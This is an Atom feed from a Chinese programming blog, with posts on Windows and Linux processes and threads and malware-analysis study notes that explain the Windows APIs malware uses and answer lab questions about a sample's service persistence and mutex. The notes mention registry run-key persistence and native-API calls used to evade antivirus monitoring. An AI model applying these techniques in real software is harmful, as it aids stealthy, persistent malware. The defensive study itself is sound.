<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wking&#39;s Note</title>
  
  <subtitle>阅览室</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-04-12T03:08:17.733Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows下的线程与进程</title>
    <link href="http://yoursite.com/2018/04/09/re_thread_and_process/"/>
    <id>http://yoursite.com/2018/04/09/re_thread_and_process/</id>
    <published>2018-04-09T07:55:29.898Z</published>
    <updated>2018-04-12T03:08:17.733Z</updated>
    
    <content type="html"><![CDATA[<p>进程与线程是Windows下最常用的方式<br><a id="more"></a></p><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> <span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>fork是linux下创建线程，这里通过pipe来进行进程间的通讯<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">int</span> fd[<span class="number">2</span>];</div><div class="line">    <span class="keyword">char</span> buff[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line"> <span class="keyword">pid_t</span> pid;</div><div class="line"> <span class="keyword">if</span>(pipe(fd)&lt;<span class="number">0</span>)</div><div class="line"> &#123;</div><div class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line"> &#125;</div><div class="line">    <span class="keyword">if</span>((pid=fork())&lt;<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>( pid&gt;<span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">        close(fd[<span class="number">0</span>]);</div><div class="line">        write(fd[<span class="number">1</span>],<span class="string">"hello\n"</span>,<span class="number">6</span>);</div><div class="line">        wait(<span class="literal">NULL</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        close(fd[<span class="number">1</span>]);</div><div class="line">        n=read(fd[<span class="number">0</span>],buff,<span class="number">128</span>);</div><div class="line">        write(STDOUT_FILENO,buff,n);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">进程优点：编程、调试简单，可靠性较高。</div><div class="line">进程缺点：创建、销毁、切换速度慢，内存、资源占用大。</div><div class="line">线程优点：创建、销毁、切换速度快，内存、资源占用小。</div><div class="line">线程缺点：编程、调试复杂，可靠性较差。</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;进程与线程是Windows下最常用的方式&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———分析恶意Windows程序</title>
    <link href="http://yoursite.com/2018/04/04/re_evil_3/"/>
    <id>http://yoursite.com/2018/04/04/re_evil_3/</id>
    <published>2018-04-03T23:57:40.888Z</published>
    <updated>2018-04-11T02:51:33.248Z</updated>
    
    <content type="html"><![CDATA[<p>多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。<br><a id="more"></a></p><h1 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h1><p>Windows API是一个广泛的功能集合，管理着恶意代码与微软程序库之间的交互方式。Windows API使用特定术语，名字，已经约定。</p><h2 id="类型和匈牙利表达法"><a href="#类型和匈牙利表达法" class="headerlink" title="类型和匈牙利表达法"></a>类型和匈牙利表达法</h2><p>多数Windows API使用它自己的 名字，来表示C语言类型。Windows总体上使用匈牙利表达法，作为API函数标识符，这个表达式 使用一个前缀命名模式。<br>windows API中的常见类型<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">类型和前缀                    描述</div><div class="line">WORD(w) 一个<span class="number">16</span>位的无符号数值</div><div class="line">DWORD(dw) 一个双字节，<span class="number">32</span>位的无符号数值</div><div class="line">Handles(H) 一个对象索引</div><div class="line">Long Pointer(L) 一个指向另一类型的指针</div><div class="line">Callback表示一个将会被Windows API调用的函数</div></pre></td></tr></table></figure></p><h2 id="句柄-HANDLE"><a href="#句柄-HANDLE" class="headerlink" title="句柄(HANDLE)"></a>句柄(HANDLE)</h2><p>句柄是在操作系统中被打开或被创建的项。你对句柄做的唯一的事情，就是保存它，并在后续函数调用中使用它来引用同一对象。<br>例:CreateWindowEx函数是一个句柄的简单例子。他返回一个HWND,这是一个窗口句柄。任何时候当你想要对那个窗口做些什么，比如调用DestroyWindows函数是，你就需要使用这个窗口。</p><h2 id="文件系统函数"><a href="#文件系统函数" class="headerlink" title="文件系统函数"></a>文件系统函数</h2><p>恶意代码与系统交互的一个最常用的方式就是创建或修改文件，而且独特文件名或修改为既有的文件名是明显的基于主机的感染现象。</p><h3 id="CreateFile"><a href="#CreateFile" class="headerlink" title="CreateFile"></a>CreateFile</h3><p>这个函数被用来创建和打开文件。它可以打开已经存在的文件，管道，流，以及I/O设备。还能创建新的文件。<br>函数结构体<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">LPCTSTR,lpFileName,     <span class="comment">//指向文件名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwDesiredAccess,  <span class="comment">//访问模式（读/写）  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwShareMode,       <span class="comment">//共享模式  </span></span></span></div><div class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES lpSecurityAttributes,<span class="comment">//指向安全属性的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwCreationDisposition,               <span class="comment">//如何让创建  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwFlagAndAttributes,                 <span class="comment">//文件属性  </span></span></span></div><div class="line"><span class="function"><span class="params">HANDLE hTemplateFile                       <span class="comment">//用于复制文件句柄  </span></span></span></div><div class="line">)；</div></pre></td></tr></table></figure></p><h3 id="ReadFile和WriteFile"><a href="#ReadFile和WriteFile" class="headerlink" title="ReadFile和WriteFile"></a>ReadFile和WriteFile</h3><p>这两个函数用来对文件进行读写<br>ReadFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">ReadFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">    HANDLE hFile,                                    <span class="comment">//文件的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">    LPVOID lpBuffer,                                <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span></div><div class="line"><span class="function"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span></div><div class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span></div><div class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped</span></span></div><div class="line"><span class="function"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span></div><div class="line"><span class="function"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>WriteFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HANDLE  hFile,<span class="comment">//文件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPCVOID lpBuffer,<span class="comment">//数据缓存区指针</span></span></span></div><div class="line"><span class="function"><span class="params">DWORD   nNumberOfBytesToWrite,<span class="comment">//你要写的字节数</span></span></span></div><div class="line"><span class="function"><span class="params">LPDWORD lpNumberOfBytesWritten,<span class="comment">//用于保存实际写入字节数的存储区域的指针</span></span></span></div><div class="line"><span class="function"><span class="params">LPOVERLAPPED lpOverlapped<span class="comment">//OVERLAPPED结构体指针</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="CreateFileMapping和MapViewofFile"><a href="#CreateFileMapping和MapViewofFile" class="headerlink" title="CreateFileMapping和MapViewofFile"></a>CreateFileMapping和MapViewofFile</h3><p>文件映射经常被恶意代码作者使用，因为它们允许讲一个文件加载到内存中，以便更加容易地进行操作。CreateFileMapping函数负责从磁盘上加载一个文件到内存。MapViewofFile函数则返回一个指向映射的基地址指针，它可以被用来访问内存中的文件。<br>CreateFileMapping函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">_In_HANDLE hFile,</span></span></div><div class="line"><span class="function"><span class="params">_In_opt_LPSECURITY_ATTRIBUTES lpAttributes,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD flProtect,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD dwMaximumSizeHigh,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD dwMaximumSizeLow,</span></span></div><div class="line"><span class="function"><span class="params">_In_opt_LPCTSTR lpName</span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>MapViewofFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">　　__in HANDLE hFileMappingObject,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwDesiredAccess,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetHigh,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetLow,</span></span></div><div class="line"><span class="function"><span class="params">　　__in SIZE_T dwNumberOfBytesToMap</span></span></div><div class="line"><span class="function"><span class="params">　　)</span></span>;</div><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFileEx</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">　　__in HANDLE hFileMappingObject,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwDesiredAccess,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetHigh,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetLow,</span></span></div><div class="line"><span class="function"><span class="params">　　__in SIZE_T dwNumberOfBytesToMap,</span></span></div><div class="line"><span class="function"><span class="params">　　__in LPVOID lpBaseAddress</span></span></div><div class="line"><span class="function"><span class="params">　　)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h3><p>Windows系统中有一些特殊文件类型，它们的访问方式与普通文件不太一样。恶意程序经常使用特殊文件。比如:一下特殊文件比普通文件更隐蔽，因为它们在列出目录时不会显示出来，某些特殊文件可以提取对系统硬件和内部数据更强的访问能力。</p><h2 id="Windows注册表"><a href="#Windows注册表" class="headerlink" title="Windows注册表"></a>Windows注册表</h2><p>Windows注册表被用来保存操作系统与程序配置信息，比如设置和选项，和文件系统一样，它是基于主机的感染迹象的很好来源，并且能够揭示出关于恶意代码功能的有用信息。Windows的早期版本使用.ini文件来保存配置信息。注册表被引入后，作为一个层次逐步提升。现在几乎所有的Windows配置信息都保存在注册表中，包括网络驱动，启动项，用户账户，以及其他信息。<br>恶意代码经常使用注册表来完成持久驻留或者存储配置数据。恶意代码添加项到注册表中，这使它在计算机引导时能够自动运行。</p><h3 id="你需要知道几个重要的注册表术语"><a href="#你需要知道几个重要的注册表术语" class="headerlink" title="你需要知道几个重要的注册表术语"></a>你需要知道几个重要的注册表术语</h3><p>根键: 注册表被划分为称为根键的5个顶层节。有时，术语HKEY和储巢也被使用。每一个跟键有一个特定的目的。<br>子键: 一个子键就像一个文件夹中的子文件夹<br>键: 一个键是一个注册表中的文件夹，它可以包含额外的文件夹或键值。跟健和子键都是键。<br>值项: 一个值项是一个配对的名字和值。<br>值或数据: 值或数据是存储在注册表项中的数据。</p><h3 id="注册表根键"><a href="#注册表根键" class="headerlink" title="注册表根键"></a>注册表根键</h3><p>注册表被划分成下面5个键:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HEKY_LOCAL_MACHINE(HKLM) 保存对本地机器全局设置</div><div class="line">HEKY_CURRENT_USER(HKCU)  保存当前用户特定的设置</div><div class="line">HEKY_CLASSES_ROOT  保存定义的类型信息</div><div class="line">HEKY_CURRENT_CONFIG 保存关于当前硬件配置的设置</div><div class="line">HEKY_USERS 定义默认用户，新用户和当前用户的配置</div></pre></td></tr></table></figure></p><p>最常用的根键是HKLM和HKCU。</p><h3 id="注册表编辑器-Regedit"><a href="#注册表编辑器-Regedit" class="headerlink" title="注册表编辑器(Regedit)"></a>注册表编辑器(Regedit)</h3><p>注册表编辑器(Regedit)是windows内建的用来查看和编辑注册表的工具。</p><h3 id="自启动程序"><a href="#自启动程序" class="headerlink" title="自启动程序"></a>自启动程序</h3><p>向run子健中写入项，是一个普定设置程序自启动的方法，尽管不是一个隐蔽的技术，它任然经常被恶意代码用来自启动自身程序。(Autoruns工具可以使用)</p><h3 id="常用注册表函数"><a href="#常用注册表函数" class="headerlink" title="常用注册表函数"></a>常用注册表函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RegOpenKeyEx 打开一个注册表进行编辑和查询(有些函数例外，大多数还是会使用的)。</div><div class="line">RegSetValueEx 添加一个新值到注册表，并设置它的数值。</div><div class="line">RegGetValue   返回注册表中一个值项的数值</div></pre></td></tr></table></figure><h2 id="网络API"><a href="#网络API" class="headerlink" title="网络API"></a>网络API</h2><h3 id="伯克利兼容套接字"><a href="#伯克利兼容套接字" class="headerlink" title="伯克利兼容套接字"></a>伯克利兼容套接字</h3><p>在Windows的网络选项中，恶意代码最普遍使用的是伯克利兼容套接字，在UNIX也是一样的。伯克利兼容套接字的网络功能在Windows系统中是由Winsock库实现的，主要在ws32_32.dll中，在所有库函数中，socket,connect,bind,listen,accept,send和recv函数最常用的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">socket创建一个套接字</div><div class="line">bind将一个套接字绑定到特定端口，应该在accept前调用</div><div class="line">listen准备着一个套接字将进入监听，等待入站连接</div><div class="line">accept向一个远程套接字打开一个连接，并接受连接</div><div class="line">connect向一个远程套接字打开一个连接，远程套接字必须在等待连接</div><div class="line">recv 从远程套接字接收数据</div><div class="line">send发送数据到远程套接字</div></pre></td></tr></table></figure></p><h2 id="跟踪恶意代码的运行"><a href="#跟踪恶意代码的运行" class="headerlink" title="跟踪恶意代码的运行"></a>跟踪恶意代码的运行</h2><h3 id="动态链接库-DLL"><a href="#动态链接库-DLL" class="headerlink" title="动态链接库(DLL)"></a>动态链接库(DLL)</h3><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件<br>恶意代码作者使用DLL的三种方式:</p><h4 id="保存恶意代码"><a href="#保存恶意代码" class="headerlink" title="保存恶意代码"></a>保存恶意代码</h4><p>有时候将恶意代码保存到一个DLL文件比exe文件更加有利。它可以附加到其他进程</p><h4 id="通过使用Windows-DLL"><a href="#通过使用Windows-DLL" class="headerlink" title="通过使用Windows DLL"></a>通过使用Windows DLL</h4><p>可以通过windows调用dll的程序</p><h4 id="通过使用第三方的DLL"><a href="#通过使用第三方的DLL" class="headerlink" title="通过使用第三方的DLL"></a>通过使用第三方的DLL</h4><p>因为是动态链接，所以可以使用第三方的DLL</p><h4 id="DLL的结构"><a href="#DLL的结构" class="headerlink" title="DLL的结构"></a>DLL的结构</h4><p>dll的文件结构几乎和exe文件一模一样，只有一个单一的标志指示这是dll。DLL经常有更多的导出函数，并且导入函数较少。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>恶意代码可以通过创建一个新的进程或修改一个已存在的进程，来执行恶意代码。<br>创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> <span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。<br>创建一个新的线程CreateThread</p><h3 id="使用互斥量-mutex-的进程间协作"><a href="#使用互斥量-mutex-的进程间协作" class="headerlink" title="使用互斥量(mutex)的进程间协作"></a>使用互斥量(mutex)的进程间协作</h3><p>互斥量是全局对象，用于协调多个进程和线程。主要用于控制共享资源的访问，并且经常被恶意代码使用(因为它们经常使用硬编码)。因为如果一个互斥量被两个不使用其它方式通讯的进程使用时，它的名字必须是互斥一致的。<br>一个互斥量可以通过CreateMutex函数进行创建，而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，当一个线程完成对互斥量的使用后，需要使用ReleaseMutex</p><h2 id="内核与用户模式"><a href="#内核与用户模式" class="headerlink" title="内核与用户模式"></a>内核与用户模式</h2><p>Windows使用两种处理器特权级别:内核模式与用户模式。<br>依据处理器上执行的代码的类型，处理器在两个模式之间切换。应用程序在用户模式下执行。核心操作系统组件在内核模式下执行。多个驱动程序在内核模式下执行，但某些驱动程序在用户模式下执行。<br>用户模式：不能直接访问硬件，应用程序的虚拟地址空间除了为专用空间以外。还会受到限制。在用户模式下执行的处理器无法訪问为该操作系统保留的虚拟地址。限制用户模式应用程序的虚拟地址空间可防止应用程序更改而且可能损坏关键的操作系统数据。<br>内核模式: 内核模式下执行的全部代码都共享单个虚拟地址空间。这表示内核模式驱动程序未从其它驱动程序和操作系统自身独立开来。</p><h2 id="原生态API"><a href="#原生态API" class="headerlink" title="原生态API"></a>原生态API</h2><p>原生态API是用来和Windows进行交互的底层API,他们很少被非恶意软件使用，但是在恶意代码作者之间却很受欢迎。调用原生API函数可以绕过普通Windows API。<br>当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要的数据结构都会被保存在内核中。这时用户程序被给予对用户API(如:DLL)的访问，这些DLL会调用ntdll.dll，这是一个特殊的DLL程序，它管理用户空间与内核的 交互。然后处理器却换到内核模式，并执行内核中的一个函数。这里ntdll函数像内核中的函数一样，使用API和结构体，这些函数组成了原生API。应用程序不建议调用原生API,但是操作系统中没有任何东西来阻止它们这样做。所有直接调用原生API对恶意代码作者来说很有吸引力，因为原生态API允许它们做一些采用别的方式不可能做到的事情，同时有时候很隐蔽(比如:一些反病毒软件是监控一个进程使用的系统调用，这里就可以躲避啦)。</p><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><h3 id="这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行"><a href="#这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行" class="headerlink" title="这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行"></a>这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行</h3><p>发现两个函数:<br><img src="https://i.imgur.com/KkNhcak.png" alt=""><br>其中一个是StartServiceCtrlDispatcherA——&gt;在2000/XP等基于NT 的操作系统中，有一个服务管理器，它管理的后台进程被称为 service。在任务管理器中，并且随系统启动而最先运行，随系统关闭而最后停止。</p><h3 id="为什么程序会使用一个互斥量"><a href="#为什么程序会使用一个互斥量" class="headerlink" title="为什么程序会使用一个互斥量"></a>为什么程序会使用一个互斥量</h3><p>用于控制共享资源的访问</p><h3 id="可以用来检测这个程序的基于主机特征是什么？"><a href="#可以用来检测这个程序的基于主机特征是什么？" class="headerlink" title="可以用来检测这个程序的基于主机特征是什么？"></a>可以用来检测这个程序的基于主机特征是什么？</h3><p>使用Malservice与HGL345的互斥量，发现恶意域名:<a href="http://www.malwareanalysisbook.com" target="_blank" rel="external">http://www.malwareanalysisbook.com</a></p><h3 id="检测这个恶意代码基于网络特征是什么？"><a href="#检测这个恶意代码基于网络特征是什么？" class="headerlink" title="检测这个恶意代码基于网络特征是什么？"></a>检测这个恶意代码基于网络特征是什么？</h3><p>发现恶意域名:<a href="http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数" target="_blank" rel="external">http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数</a></p><h3 id="这个程序的目的是什么"><a href="#这个程序的目的是什么" class="headerlink" title="这个程序的目的是什么"></a>这个程序的目的是什么</h3><p>开机自启动，并且访问域名<a href="http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件" target="_blank" rel="external">http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件</a></p><h3 id="这个程序什么时候完成执行"><a href="#这个程序什么时候完成执行" class="headerlink" title="这个程序什么时候完成执行"></a>这个程序什么时候完成执行</h3><p>关机即结束</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———识别汇编中的C代码结构</title>
    <link href="http://yoursite.com/2018/03/31/re_evil_2/"/>
    <id>http://yoursite.com/2018/03/31/re_evil_2/</id>
    <published>2018-03-31T09:02:09.417Z</published>
    <updated>2018-04-03T23:59:00.519Z</updated>
    
